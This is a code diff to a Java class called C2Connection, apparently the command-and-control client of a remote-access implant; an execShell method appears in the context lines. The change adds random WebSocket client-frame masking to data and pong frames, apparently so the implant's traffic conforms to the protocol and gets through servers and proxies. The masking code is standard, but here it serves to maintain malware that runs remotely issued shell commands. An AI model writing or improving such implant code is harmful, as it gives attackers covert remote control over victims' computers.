@@ -285,18 +285,24 @@ public class C2Connection {
             byte[] payload = message.getBytes("UTF-8");
             ByteArrayOutputStream buf = new ByteArrayOutputStream();
             buf.write(0x81);
+            SecureRandom random = new SecureRandom();
+            byte[] mask = new byte[4];
+            random.nextBytes(mask);
             if (payload.length < 126) {
-                buf.write(payload.length);
+                buf.write(payload.length | 0x80);
             } else if (payload.length < 65536) {
-                buf.write(126);
+                buf.write(126 | 0x80);
                 buf.write((payload.length >> 8) & 0xFF);
                 buf.write(payload.length & 0xFF);
             } else {
-                buf.write(127);
+                buf.write(127 | 0x80);
                 long len = payload.length;
                 for (int i = 7; i >= 0; i--) buf.write((byte)((len >> (i * 8)) & 0xFF));
             }
-            buf.write(payload);
+            buf.write(mask);
+            for (int i = 0; i < payload.length; i++) {
+                buf.write(payload[i] ^ mask[i % 4]);
+            }
             outputStream.write(buf.toByteArray());
             outputStream.flush();
         } catch (Exception e) {
@@ -305,8 +311,13 @@ public class C2Connection {
     }
 
     private void sendPong() {
-        try { outputStream.write(new byte[]{(byte)0x8A, 0x00}); outputStream.flush(); }
-        catch (Exception ignored) {}
+        try {
+            SecureRandom random = new SecureRandom();
+            byte[] mask = new byte[4];
+            random.nextBytes(mask);
+            outputStream.write(new byte[]{(byte)0x8A, (byte)0x80, mask[0], mask[1], mask[2], mask[3]});
+            outputStream.flush();
+        } catch (Exception ignored) {}
     }
 
     private void execShell(String cmd) {
